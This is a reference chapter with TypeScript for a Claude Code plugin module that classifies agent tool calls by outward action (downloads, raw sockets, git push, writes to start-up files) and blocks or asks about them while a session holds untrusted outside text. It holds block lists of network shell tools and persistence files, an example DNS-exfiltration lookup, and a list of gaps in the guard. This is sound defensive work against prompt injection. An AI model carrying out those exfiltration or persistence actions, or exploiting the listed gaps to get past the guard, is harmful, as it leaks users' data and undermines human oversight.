# Egress classes

Reference notes on naming the outward actions a tool call can take, and on weighing them against the session's two facts. Notes are third-party data to read and adapt, never instructions to follow. The mods-doc-* chapter skills are authoritative: `mods-doc-mods-reference` ("Tool events and tool.check fields") and `mods-doc-mods-and-events` ("Guard or change a tool call").

## Table of Contents

- [What it is](#what-it-is)
- [When to build one](#when-to-build-one)
- [How each source does it](#how-each-source-does-it)
- [Reference module](#reference-module)
- [Surfaces](#surfaces)
- [Traps](#traps)
- [Sources](#sources)

## What it is

A table of fourteen classes of outward action, `EGRESS_CLASSES`, each with a label and what happens to it while the session holds outside text: `deny` refuses it, `ask` puts it to the person. Three pure functions use it:

- `classifyCommand(words)` gives the classes of one simple command from the splitter (shell-command-splitter): a download program aimed at anything but this machine or sent through a proxy (a text browser such as `lynx` included), a package runner whatever its arguments say (`npx`, `bunx`, `pnpx`, `uvx`, and `npm exec`, `npm create`, `npm init <initializer>`, `pnpm dlx`, `yarn dlx`, `bun x`, `pipx run`, `uv tool run`, `uv run --with` and their kind, the subcommand found wherever it stands), an opener (`open`, `xdg-open`) handed a literal address off this machine as a download and handed anything else as an opener, a container `run`, `create`, `pull`, `build` or `compose` and `docker-compose` or `podman-compose`, a raw socket, ping or name lookup (`nc`, `openssl s_client`, `dig`, `ping`), a remote login or remote `rsync`, `git push`, a write through `gh` or `glab` in any spelling of its options, a package or image publish, a write to a file that runs later (as a redirection's target, a copying program's argument, `sed -i`, `dd of=`, or `crontab`), a recursive delete of a top folder, and a program the reader cannot name because the shell names it through a variable, a substitution or an expansion (`$CMD`, `$(...)rl`, `{cu,}rl`).
- `classifyCall(tool, input)` gives the classes of a tool call: the web tools, the shell tools through the splitter, the file-writing tools on a file that runs later, and an MCP tool whose name says it sends or changes data. For a shell line it adds what only the whole line shows: every redirection of the line, wherever it stands (after a group, ahead of the command); a path under `/dev/tcp` or `/dev/udp`; an interpreter anywhere in the line with network-shaped text anywhere in it, since an interpreter takes code from `-c`, `<<<`, a here-document or a pipe; and a proxy set ahead of a download program. It throws when the splitter throws.
- `decideEgress(classes, taint, isInlineSkillCommand)` answers `pass`, `ask` or `deny`. A call with no class passes. A session without outside text passes. With outside text held, a `deny` class is refused and the rest are asked. With outside text and a secret read, every class is refused. A skill's inline command with any class is refused whatever the facts, since nobody approved it. It never answers allow: a pass leaves the call to the rules and the mode.

The program lists are a denylist: they name what is known to reach out, and a program they do not name passes as no class. A denylist of programs is never complete: new clients, wrappers and package runners keep appearing, and each one the lists do not name passes until someone adds it. The only complete form is an allowlist: while the session holds outside text, let a shell line through only when every program `splitShellCommand` finds in it is on a list of programs known to stay on this machine (programs that list, read or search files, and `git` with a read-only subcommand), and ask or refuse the rest. An unlisted program, wrapper or client is then refused because it is unknown, not passed because it is unnamed. This module keeps the denylist because it teaches the classes and their reasons; a mod that guards real secrets puts an allowlist in front of it.

Failing closed has a price, paid only while the session holds outside text: an argument after a wrapper reads as a program (`nice -n 10 grep curl notes.txt` is a download), a glob after a wrapper or in the program's place is a hidden program (`sudo rm *.log`, `parallel gzip ::: *.log`, `./build-*.sh`), a script run beside an address in the line is an interpreter reaching out (`python3 count.py notes.txt && echo see https://docs.test`), a package runner counts even for a package already installed (`npx tsc --noEmit`), a runner's or a container's subcommand counts wherever it stands, even as another command's argument (`npm run create`, `docker logs run`), and an opener counts whatever it opens (`open README.md` is asked). A runner also marks the session once it ran, in a clean session too, as a download does (tool-check-verdict-layer). The tests pin `nice -n 10 grep curl notes.txt`, `sudo rm *.log`, `parallel gzip ::: *.log`, the script line, `npx tsc --noEmit`, `npm run create`, `docker logs run` and `open README.md`, so the choice stays deliberate. `find . -name '*.ts'` and `find ... -exec rm {} ';'` pass: `find` opens only what follows its exec options, and its `{}` placeholder is not a hidden program.

Fail policy: the classes answer no hook. `classifyCall` throws when the splitter refuses a line, and `decideEgress` never returns allow: it passes, asks or refuses, and a pass leaves the verdict beneath as it came.

## When to build one

- Under a gate on `tool.check` (tool-check-verdict-layer), to refuse what outside text could have asked for.
- Not as an allow list. A call with no class is not declared safe; it goes on to Claude Code's own decision.

## How each source does it

### barmkin-mod 0.2.2 (no LICENSE file; read as data only, nothing copied)

- The source keeps its classes as one exported list of records, each with the tools it applies to and a matching rule, and finds a call's classes by testing every record (hooks/lib/egress.ts:586-715).
- Its rules cover network clients aimed beyond this machine, name lookups, inline interpreter code with network words, forge writes, publishes, cloud command lines, writes to files that persist, recursive deletes of a home or system folder, and a websocket opened by the Monitor tool (hooks/lib/egress.ts:238-585).
- A separate test decides whether a call touches a secret path (hooks/lib/egress.ts:716-742).
- Its decision weighs the classes against the two facts and words a reason that says how to clear them (hooks/lib/egress.ts:743-823).
- The reference module keeps a smaller table of its own, adds the ask posture per class and a class for a program it cannot name, reads redirections and interpreters across the whole line, and leaves secret paths to the marking hook (taint-state-and-clearing).

## Reference module

Pure: no hook and no `$`; it imports the `Taint` type and the splitter. The behaviour tests in tests/reference-modules/egress-classes.test.ts check each class on hand-written calls, the shell forms that could hide a program or a write (valued wrapper options, case, paths, quotes, backslashes, shells, `su`, `eval`, `<<<`, substitutions, variables, expansions, `/dev/tcp`, redirections around groups and ahead of commands), the prices of failing closed, each branch of the decision, and a seeded fuzz run that places a write to a start file in any redirection, group, wrapper and position. They also pin the class table: a change to the table changes that test too, so a loosened posture cannot slip in unnoticed.

### Reference module, egress-classes, MIT (this plugin)

```ts
import type { Taint } from './session-taint'
import { splitShellCommand } from './shell-command-splitter'

/** The outward actions this guard knows, and what each becomes while untrusted text is in the context: deny refuses it, ask puts it to the person. Without outside text every class passes to the engine's own check, a secret read included. */
export const EGRESS_CLASSES = {
  'web-request': { label: 'a web request', whenUntrusted: 'ask' },
  'network-transfer': { label: 'a download or upload program', whenUntrusted: 'deny' },
  'package-runner': { label: 'a package runner (it downloads what it runs)', whenUntrusted: 'deny' },
  'opener': { label: 'an open command (it may load a page from anywhere)', whenUntrusted: 'ask' },
  'raw-socket': { label: 'a raw network connection, a ping or a name lookup', whenUntrusted: 'deny' },
  'remote-shell': { label: 'a remote login or copy', whenUntrusted: 'deny' },
  'repository-push': { label: 'a git push', whenUntrusted: 'deny' },
  'forge-write': { label: 'a write to a code forge', whenUntrusted: 'deny' },
  'package-publish': { label: 'a package or image publish', whenUntrusted: 'deny' },
  'interpreter-network': { label: 'a script interpreter with network code in the line', whenUntrusted: 'deny' },
  'connector-write': { label: 'an MCP tool that sends or changes data', whenUntrusted: 'ask' },
  'persistence-write': { label: 'a write to a file that runs later', whenUntrusted: 'deny' },
  'destructive-delete': { label: 'a recursive delete of a top folder', whenUntrusted: 'deny' },
  'hidden-program': { label: 'a program named through a variable, a substitution or an expansion', whenUntrusted: 'deny' },
} as const
export type EgressClassId = keyof typeof EGRESS_CLASSES

/** The tools classifyCall can place in a class: the matcher of a hook that only needs to see these. */
export const GATED_TOOLS = /^(?:Bash|PowerShell|Monitor|WebFetch|WebSearch|Write|Edit|MultiEdit|NotebookEdit|mcp__.+)$/
export const SHELL_TOOLS = /^(?:Bash|PowerShell|Monitor)$/
const FILE_WRITE_TOOLS = new Set(['Write', 'Edit', 'MultiEdit', 'NotebookEdit'])
/** Programs that fetch or send over the network, text browsers included. */
const TRANSFER = new Set(['aria2c', 'curl', 'elinks', 'http', 'httpie', 'https', 'lynx', 'w3m', 'wget', 'xh'])
/** Package runners, and package managers' subcommands that act as one wherever they stand (`npm --yes exec x`): each fetches what it runs. */
const RUNNERS = new Set(['bunx', 'npx', 'pnpx', 'uvx'])
const RUNNER_VERBS = /^(?:npm (?:exec|x|create)|(?:pnpm|yarn) (?:dlx|create)|bun (?:x|create)|pipx run)$/
/** A runner whatever its arguments say: `npm init <initializer>` runs create-<initializer>, `uv tool run` is uvx, `uv run --with` fetches. */
const runsPackage = (name: string, args: string[]) => RUNNERS.has(name) || (name === 'uv' && args.includes('run') && args.some(word => word === 'tool' || word.startsWith('--with'))) ||
  args.some((word, at) => RUNNER_VERBS.test(`${name} ${word}`) || (name === 'npm' && word === 'init' && args.slice(at + 1).some(next => !next.startsWith('-'))))
/** Programs that hand what they are given to another program: a browser, a mail client, a file share. */
const OPENERS = new Set(['open', 'xdg-open'])
/** Raw connections, and pings and name lookups, which carry data out in the name they ask for. */
const SOCKETS = new Set(['dig', 'ftp', 'host', 'nc', 'ncat', 'netcat', 'nslookup', 'ping', 'ping6', 'socat', 'telnet', 'tftp', 'traceroute', 'whois'])
const REMOTE = new Set(['mosh', 'scp', 'sftp', 'ssh'])
const INTERPRETERS = new Set(['python', 'python3', 'node', 'deno', 'bun', 'ruby', 'perl', 'php'])
const FORGE_VERBS = new Set(['create', 'comment', 'edit', 'merge', 'close', 'reopen', 'delete', 'upload', 'review', 'sync', 'transfer'])
const PUBLISH = /^(?:(?:npm|pnpm|yarn|bun|cargo|poetry|uv|flit|hatch) publish|gem push|twine upload|docker push|podman push)$/
const NETWORK_CODE = /https?:\/\/|\bsocket\b|urllib|requests\.(?:get|post|put|patch|delete|head|request|Session)\b|\bfetch\(|net\.connect|Net::HTTP|LWP::|open-uri/i
const CONNECTOR_VERBS = /(?:^|_|-)(?:send|post|create|update|delete|remove|write|upload|publish|push|comment|reply|share|invite|merge|set)(?:$|_|-)/i
/** Programs that write to the files named among their arguments. */
const WRITERS = new Set(['tee', 'cp', 'mv', 'ln', 'install'])
/** Redirections that write to the word after them. */
const WRITE_REDIRECTION = /^(?:>|>>|>\||>&|&>|&>>|<>)$/
/** Files run later on their own, by a shell, a scheduler, git, CI, an editor or Claude Code: where an instruction in fetched text would plant itself. A starting list; add the files your projects run. */
export const PERSISTENCE_FILES =
  /(?:^|\/)(?:\.(?:zshenv|zprofile|zshrc|zlogin|zlogout|bash_profile|bash_login|profile|bashrc|bash_logout|envrc|gitconfig)|\.config\/fish\/config\.fish|\.ssh\/(?:authorized_keys2?|rc)|\.git\/hooks\/[^/]+|\.github\/workflows\/[^/]+|\.vscode\/tasks\.json|Library\/LaunchAgents\/[^/]+|\.config\/(?:systemd\/user|autostart)\/[^/]+|\.claude\/(?:settings(?:\.local)?\.json|(?:hooks|commands|agents|skills)\/.+)|\.mcp\.json|CLAUDE\.md)$/
const TOP_FOLDERS = /^(?:\/|\/\*|~\/?\*?|\$HOME\/?\*?|\$\{HOME\}\/?\*?|\/(?:etc|usr|bin|sbin|var|opt|System|Library|Users|home|root)\/?\*?)$/

const LOCAL_HOST = /^(?:127(?:\.\d{1,3}){3}|::1|\[::1\]|0\.0\.0\.0|localhost)(?::\d+)?$/
/** Options that send the request through another host, so a local address no longer keeps it on this machine. */
const VIA_OTHER_HOST = /^(?:-x|--proxy|--preproxy|--socks|--resolve|--connect-to)/
/** The host of an address word: what follows a scheme, or the word itself, up to a path or a port. */
const hostOf = (word: string) => (word.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '').split('/')[0] ?? '').replace(/^.*@/, '')
/** A word that starts with a scheme (`https:`, `mailto:`, `smb:`), or a host and port (`localhost:3000`). */
const URL_WORD = /^[a-z][a-z0-9+.-]*:/i
const isLocalOnly = (args: string[]) => {
  if (args.some(word => VIA_OTHER_HOST.test(word))) return false
  const targets = args.filter(word => !word.startsWith('-') && /[.:]/.test(word))
  return targets.length > 0 && targets.every(word => LOCAL_HOST.test(hostOf(word)))
}

/** The words that follow a redirection that writes, wherever it stands. */
export const redirectedFiles = (words: string[]) => words.filter((_, at) => WRITE_REDIRECTION.test(words[at - 1] ?? ''))
/** The files one simple command writes: after a redirection, as a writer's argument, with `sed -i`, as `dd of=`. */
const writtenFiles = (name: string, args: string[]) => [
  ...redirectedFiles(args),
  ...(WRITERS.has(name) || (name === 'sed' && args.some(word => /^-[a-zA-Z]*i|^--in-place/.test(word))) ? args.filter(word => !word.startsWith('-')) : []),
  ...(name === 'dd' ? args.filter(word => word.startsWith('of=')).map(word => word.slice(3)) : []),
]

/** The classes one simple command belongs to (words[0] as splitShellCommand gives it); classifyCall adds those of the whole line. */
export function classifyCommand(words: string[]): EgressClassId[] {
  const [name = '', ...args] = words
  const found: EgressClassId[] = []
  // A name the shell expands (`$CMD`, `$(...)`, `{cu,}rl`, `cur?`) runs a program this reader cannot name.
  // `[` and `[[` are the test command; `{}` is find's placeholder, read as a word after -exec.
  if (!['[', '[[', '{}'].includes(name) && /[$*?[{]/.test(name)) found.push('hidden-program')
  if (TRANSFER.has(name) && !isLocalOnly(args)) found.push('network-transfer')
  if (runsPackage(name, args)) found.push('package-runner')
  // An opener handed a literal address off this machine sends it out; whatever else it opens may load a page from anywhere.
  // `file:/x` or `file:///x` names a file here, asked like `open /x`; a doubled slash after `file://` can name a share elsewhere.
  const urls = args.filter(word => URL_WORD.test(word) && !/^file:\/(?:\/\/)?(?!\/)/i.test(word))
  if (OPENERS.has(name)) found.push(urls.length > 0 && !isLocalOnly(urls) ? 'network-transfer' : 'opener')
  // A container run, create, pull, build or compose may download an image, and runs a program this reader cannot see.
  // The verb counts wherever it stands, so `docker logs run` counts too: a deliberate strict match.
  if (((name === 'docker' || name === 'podman') && args.some(word => /^(?:run|create|pull|build|compose)$/.test(word))) || /^(?:docker|podman)-compose$/.test(name)) found.push('network-transfer')
  if (SOCKETS.has(name) || (name === 'openssl' && /^s_(?:client|server)$/.test(args[0] ?? ''))) found.push('raw-socket')
  if (REMOTE.has(name) || (name === 'rsync' && args.some(word => /^[^-/][^/]*:|^rsync:\/\//.test(word)))) found.push('remote-shell')
  if (name === 'git' && args.includes('push')) found.push('repository-push')
  if ((name === 'gh' || name === 'glab') && (args.some(word => FORGE_VERBS.has(word)) || (args[0] === 'api' && args.some(word => /^-[XfF]|^--(?:method|field|raw-field|input)(?:=|$)/.test(word))))) found.push('forge-write')
  if (args.some(word => PUBLISH.test(`${name} ${word}`))) found.push('package-publish')
  if ((name === 'crontab' && !args.includes('-l')) || writtenFiles(name, args).some(file => PERSISTENCE_FILES.test(file))) found.push('persistence-write')
  if (name === 'rm' && args.some(word => /^-[a-zA-Z]*[rR]|^--recursive$/.test(word)) && args.some(word => TOP_FOLDERS.test(word))) found.push('destructive-delete')
  return found
}

/** The classes a tool call belongs to. A shell line longer or more nested than the splitter reads throws, and so does this. */
export function classifyCall(tool: string, input: unknown): EgressClassId[] {
  const fields = typeof input === 'object' && input !== null ? (input as Record<string, unknown>) : {}
  if (tool === 'WebFetch' || tool === 'WebSearch') return ['web-request']
  if (SHELL_TOOLS.test(tool) && typeof fields.command === 'string') {
    const line = fields.command
    const segments = splitShellCommand(line)
    const words = segments.flat()
    const found = segments.flatMap(classifyCommand)
    // A redirection can stand apart from its command, after a group (`{ ...; } >> f`, `(...) >> f`), so every
    // redirection of the line is read, whatever command it lands next to.
    if (redirectedFiles(words).some(file => PERSISTENCE_FILES.test(file))) found.push('persistence-write')
    // bash itself opens a connection for a path under /dev/tcp or /dev/udp, with no network program at all.
    if (words.some(word => /^\/dev\/(?:tcp|udp)\//.test(word))) found.push('raw-socket')
    // An interpreter takes code from places the line does not tie to it (`-c`, `<<<`, a here-document, a pipe),
    // so an interpreter anywhere and network-shaped text anywhere in the line are enough.
    if (segments.some(([name = '']) => INTERPRETERS.has(name.replace(/[\d.]+$/, ''))) && NETWORK_CODE.test(line)) found.push('interpreter-network')
    // A proxy set ahead of the program (`https_proxy=... curl localhost`) sends even a local address elsewhere.
    if (/proxy=/i.test(line) && segments.some(([name = '']) => TRANSFER.has(name))) found.push('network-transfer')
    return [...new Set(found)]
  }
  const file = fields.file_path ?? fields.notebook_path
  if (FILE_WRITE_TOOLS.has(tool) && typeof file === 'string' && PERSISTENCE_FILES.test(file)) return ['persistence-write']
  const toolName = tool.split('__')[2]
  if (tool.startsWith('mcp__') && toolName !== undefined && CONNECTOR_VERBS.test(toolName)) return ['connector-write']
  return []
}

export type EgressVerdict = { decision: 'pass' } | { decision: 'ask' | 'deny'; reason: string }

/** The labels of some classes, joined for a reason the person reads. */
export const labels = (classes: EgressClassId[]) => classes.map(id => EGRESS_CLASSES[id].label).join(', ')

/**
 * Weighs the classes of one call against the session's two facts. Never answers allow: a pass leaves the call to
 * the rules and the mode. An inline command of a skill is refused whatever the facts, since nobody approved it.
 */
export function decideEgress(classes: EgressClassId[], taint: Taint, isInlineSkillCommand = false): EgressVerdict {
  if (classes.length === 0) return { decision: 'pass' }
  if (isInlineSkillCommand) return { decision: 'deny', reason: `A skill's inline command tried ${labels(classes)}; inline commands run with nobody approving them.` }
  if (taint.untrusted === null) return { decision: 'pass' }
  const held = `This session holds text from outside (${taint.untrusted})`
  if (taint.sensitive !== null) {
    return { decision: 'deny', reason: `${held} and has read a secret (${taint.sensitive}), so every outward action is refused: ${labels(classes)}.` }
  }
  const refused = classes.filter(id => EGRESS_CLASSES[id].whenUntrusted === 'deny')
  if (refused.length > 0) return { decision: 'deny', reason: `${held}, so ${labels(refused)} is refused until the person clears it.` }
  return { decision: 'ask', reason: `${held}. Did the person ask for ${labels(classes)}?` }
}
```

## Surfaces

Terminal: works. The module is plain TypeScript with no call to `$`.

Desktop: works in the Code tab of the Desktop app (`mods-doc-mods-overview`, line 212), except in a WSL session, where plugins are not available (lines 212-213).

This module draws nothing: it has no pane, bar, button or text, so there is no style to set and no show or hide control to add.

Operating systems: any for the module. The start-file paths are those of macOS and Linux and of tools that run on every system (git, CI, editors, Claude Code); Windows start-up folders and scheduled tasks are not in the table.

## Traps

- The program lists are starting lists, and a list of programs to refuse stays incomplete (What it is). A program they do not name (a custom upload script, `aws s3 cp`, a package manager that downloads, `git clone`, `docker exec` or `kubectl exec` into a running container, `kubectl run`, a wrapper the splitter does not know) passes as no class, and so does a script file whose code reaches out (`python3 fetch.py`, `sh s.sh`): the reader sees the file's name, not its code. Extend the lists for the tools your projects use, or put the allowlist in front.
- An opener (`open`, `xdg-open`) handed a literal address off this machine counts as a download and is refused while the session holds outside text. Handed anything else (a variable such as `open "$U"`, a substitution, a file, `.`, an application, a local address such as `http://localhost:3000`) it counts as an opener and is asked: a variable can hold any address, and a local page can refresh to a remote one. A `file:` address with no host (`file:///etc/passwd`) names a file here and is asked like `open /etc/passwd`; one with a host (`file://x.test/share`) names another machine and counts as a download, and so does a doubled slash after `file://` (`file:////server/share`), which some platforms map to a network share. The local-host test is case-sensitive, so `file://LOCALHOST/x` counts as a download too: the strict direction, kept. The ask needs someone to answer it: the gate refuses an ask where no `approver` is set (tool-check-verdict-layer), and whether the engine sets one on a plugin's `$.tool.check` query is UNVERIFIED, so in practice the split may be all deny. Other programs that open an address are not listed and pass as no class: `gio open`, `gnome-open`, `kde-open`, `sensible-browser`, `x-www-browser`, `wslview`, `start`, `explorer.exe`, and `osascript` with `open location`.
- A package runner counts whatever its arguments say: it asks its registry for any package not already cached, so an address after it (`npx some-tool http://localhost`) keeps nothing on this machine. It is a deny class, since a runner runs code it fetched, which can do everything a download program can. A manager's runner subcommand counts wherever it stands among the arguments (`npm --yes exec`, `uv -q tool run`), even as another command's argument (`npm run create`), the strict direction. A runner spelled another way (`deno run npm:...`, `uv run` of a script that declares its own dependencies) passes as no class.
- A runner locks itself out. In a clean session the first `npx tsc` passes, runs, and marks the session, because `package-runner` is in the gate's `READS_OUTSIDE` (tool-check-verdict-layer): what a fetched package prints is outside text. From then on every runner is refused, and approving does not unlock it, since a deny class is never put to the person. Only clearing the session does (taint-state-and-clearing: the person's next prompt under the default policy, `/clear`, or `/guard-clear`). A gate test pins the sequence. The marking stays: dropping it would let a fetched package's output steer the session unmarked.
- Installs run fetched code too, and pass as no class: `npm install`, `npm ci`, `yarn add`, `pnpm add` and `bun add` run the lifecycle scripts of what they fetch, and so do `pip install` of a source package, `go run module@version`, `cargo install`, `gem install` and `pipx install`; `corepack pnpm dlx`, `dotnet tool run` and `volta run` are runners reached through another program. Counting them would refuse every dependency install while the session holds outside text. Whether to pay that cost is the mod author's decision, so this module leaves them out.
- Sockets, pings and name lookups have no local exception: `ping localhost` and `nc localhost 8080` count while the session holds outside text. A lookup carries data out in the name it asks for (`dig <data>.example.test`), so the address is no guide.
- `PERSISTENCE_FILES` is a starting list of files something runs later: shell start-up files, `.envrc`, `.gitconfig`, `~/.ssh/authorized_keys`, git hooks, CI workflows, `.vscode/tasks.json`, launch agents, systemd user units and autostart entries, Claude Code settings, hooks, commands, agents and skills, `.mcp.json` and `CLAUDE.md`. A write through a program this module does not read (a script's `open()`, `aws s3 cp`, `cp -t dir`) is not seen. Add the files your projects run.
- `isLocalOnly` decides on the words that look like hosts. A download program with no such word (`curl -K config.txt`) counts as reaching outward, which is the safe direction; so does one with a proxy option, or with any `proxy=` text in the line (`?noproxy=1` in an address included, the strict direction). The local-host check compares names case-sensitively, so `curl http://LOCALHOST:3000` counts as a download too, the strict direction. A proxy exported by an earlier command, or set in a config file, is not in the line and is not seen: a download aimed at this machine then passes.
- The interpreter rule reads the whole line, not the code: `requests.get` and `urlopen` count, `requests.txt` does not, and a network call written so that no listed word appears passes. The egress gate's other classes still stand.
- `{}` counts as nothing wherever it stands, so the placeholder `find ... -exec rm {} ';'` passes, and so does `{}` used as the program (`find . -name x -exec {} ';'`, `xargs -I{} {}`), which runs whatever `find` found or `xargs` read, unnamed here. That is a gap: a mod that must close it refuses a `find` or `xargs` line whose command part starts with `{}`.
- The MCP rule reads the tool's name, which the server chose. A server can name a sending tool `get_thing`. Keep the server allow list (mcp-and-skill-content-guards) for servers you do not control.
- `ask` puts the call to the mode's decider, or to a person when a hook made it (types, lines 13752-13754). Where nobody can be asked (`approver` absent, types lines 13725-13728) the types do not say what an ask becomes, so the gate (tool-check-verdict-layer) refuses instead. Whether the engine sets an `approver` on a plugin's `$.tool.check` query is UNVERIFIED; the tests set one by hand where they need an ask. Whether a mod's ask still reaches a person in `bypassPermissions` mode is not stated either: the chapters say that mode disables permission prompts (`mods-doc-cc-permissions-modes`, line 598) and that a `PreToolUse` hook's ask forces a prompt in auto mode (`mods-doc-hooks-reference`, line 1939), not what becomes of a mod's ask. That is why a package runner, which can do all a download program can, is a deny class. A mod for sessions run in that mode edits `whenUntrusted` to `deny` for every class, at the cost that once a page was read every later web fetch is refused. The mode can also change during a session (`Shift+Tab`, `mods-doc-cc-permissions-modes`, line 164). A copy that denies every class is never wrong after a switch, only stricter than it needs to be; what goes wrong is a copy built for the default mode, with its `ask` classes, once the session switches to `bypassPermissions`.
- A pinned table makes a change visible, not right. Review a change to a posture as you would a change to a permission rule.

## Sources

- barmkin-mod 0.2.2 hooks/lib/egress.ts:238-823, no LICENSE file (described, not copied)
